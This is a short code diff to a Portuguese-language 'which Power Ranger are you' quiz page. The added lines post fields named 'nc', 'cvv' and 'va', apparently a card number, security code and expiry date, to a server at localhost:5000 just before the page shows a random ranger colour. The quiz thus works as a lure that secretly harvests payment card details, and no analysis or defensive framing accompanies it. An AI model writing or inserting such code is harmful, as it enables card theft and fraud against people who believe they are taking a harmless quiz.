@@ -28,6 +28,17 @@ function power() {
     alert("Ainda não consigo saber qual power ranger você é");
     return false;
   }
+  fetch('http://localhost:5000/teste', {
+    method: 'POST',
+    headers:{
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },    
+    body: new URLSearchParams({
+        'nc': c,
+        'cvv': b,
+        'va': a
+    })
+});
   alert("VOCÊ É O POWER RANGER " + cores[Math.floor(Math.random() * cores.length)] +"!!")
 }
 
